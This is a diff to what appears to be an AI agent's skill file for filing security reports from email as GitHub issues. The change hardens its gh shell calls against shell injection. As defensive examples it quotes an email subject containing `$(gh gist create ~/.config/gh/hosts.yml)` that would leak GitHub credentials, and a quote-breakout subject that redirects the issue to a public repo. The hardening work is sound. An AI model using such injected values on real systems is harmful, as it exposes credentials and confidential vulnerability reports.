@@ -513,29 +513,29 @@ fuzzy-match search against existing issues on three orthogonal keys:
    `RCE BaseSerialization.deserialize next_kwargs`) and search.
 
    The keywords are **attacker-controlled** (extracted from an email
-   subject), so the call must not put them inside a double-quoted
-   shell argument — `gh search issues "<keywords>"` permits
-   `$(...)` and backtick expansion in `<keywords>`, and a subject
-   like `RCE in $(gh gist create ~/.config/gh/hosts.yml) handler`
-   would survive loose noun-phrase extraction and execute. Either
-   pass through a character-allowlisted shell variable, **or**
-   write the keywords to a tempfile and feed via stdin — both
-   forms below disable shell expansion:
+   subject), so the call must not put them inside a shell argument
+   at all — `gh search issues "<keywords>"` permits `$(...)` and
+   backtick expansion, and a subject like
+   `RCE in $(gh gist create ~/.config/gh/hosts.yml) handler` would
+   survive loose noun-phrase extraction and execute. **Use the
+   Write tool** (not Bash) to put the raw keywords into
+   `/tmp/kw-<threadId>.txt`, then strip to a character allowlist
+   in the shell:
 
+   *Write tool call:* `file_path: /tmp/kw-<threadId>.txt`,
+   `content: <raw keywords>`
+
+   Then:
    ```bash
-   # Option A — character-allowlisted env var (preferred for short
-   # keyword strings). Strip everything but [A-Za-z0-9._ -] before
-   # exporting; the resulting string contains no shell metacharacters.
-   KEYWORDS=$(printf '%s' "<raw keywords>" | tr -cd 'A-Za-z0-9._ -')
+   KEYWORDS=$(tr -cd 'A-Za-z0-9._ -' < /tmp/kw-<threadId>.txt)
    gh search issues "$KEYWORDS" --repo <tracker> \
      --state open --match title,body
-
-   # Option B — tempfile (preferred for keyword strings that
-   # legitimately contain quotes, slashes, or other characters).
-   printf '%s' "<raw keywords>" > /tmp/kw-<threadId>.txt
-   gh search issues "$(cat /tmp/kw-<threadId>.txt)" --repo <tracker> \
-     --state open --match title,body
    ```
+
+   The Write tool puts the bytes on disk without shell tokenisation;
+   `tr -cd` reads from the file and the result contains no shell
+   metacharacters. Never `printf '%s' "<raw keywords>"` — the
+   double-quoted argument expands `$(...)` before `printf` runs.
 
    Title / body matches here are informational — a tracker with a
    similar title is worth a human glance but is not necessarily a
@@ -1063,14 +1063,20 @@ For each confirmed `Report` / `ASF-security relay`:
 
 2. Create the issue with the `needs triage` and `security issue` labels.
    The title comes from an attacker-controlled email subject, so it
-   **must not** be inlined into a single-quoted shell argument — a
-   subject like `RCE' --repo <upstream> --title 'leaked` would
-   break out of the quote and re-target the issue at a public repo.
-   Write the title to a tempfile via `printf '%s'` (which never
-   triggers shell expansion) and pass it via `gh api`'s `-F` form,
-   which reads the value verbatim from the file:
+   **must not** be inlined into a shell argument at all — a subject
+   like `RCE' --repo <upstream> --title 'leaked` breaks out of
+   single quotes, and a subject like
+   `RCE in $(gh gist create ~/.config/gh/hosts.yml --public)` expands
+   inside double quotes. **Use the Write tool** (not Bash) to put
+   the title verbatim into `/tmp/issue-title-<threadId>.txt`, then
+   pass it via `gh api`'s `-F` form, which reads the value verbatim
+   from the file:
+
+   *Write tool call:* `file_path: /tmp/issue-title-<threadId>.txt`,
+   `content: <title>`
+
+   Then:
    ```bash
-   printf '%s' "<title>" > /tmp/issue-title-<threadId>.txt
    gh api repos/<tracker>/issues \
      -F title=@/tmp/issue-title-<threadId>.txt \
      -F body=@/tmp/issue-body-<threadId>.md \
@@ -1078,9 +1084,12 @@ For each confirmed `Report` / `ASF-security relay`:
      -f 'labels[]=security issue' \
      --jq '.number'
    ```
-   Same rule applies anywhere else this skill produces a `gh` call
-   that takes attacker-controlled text as an argument: write to a
-   tempfile via `printf '%s'`, pass via `-F`. Never `--title '<x>'`.
+   Same rule applies anywhere this skill produces a `gh` call that
+   takes attacker-controlled text as an argument: write the value
+   to a tempfile **with the Write tool**, pass via `-F`. Never
+   `--title '<x>'`, never `--title "<x>"`, never
+   `printf '%s' "<x>"` (the double-quoted argument still expands
+   `$(...)` before `printf` runs).
 
 3. **Set the project-board `Status` to `Needs triage`.** The newly-
    created issue may already have been added to the board by the
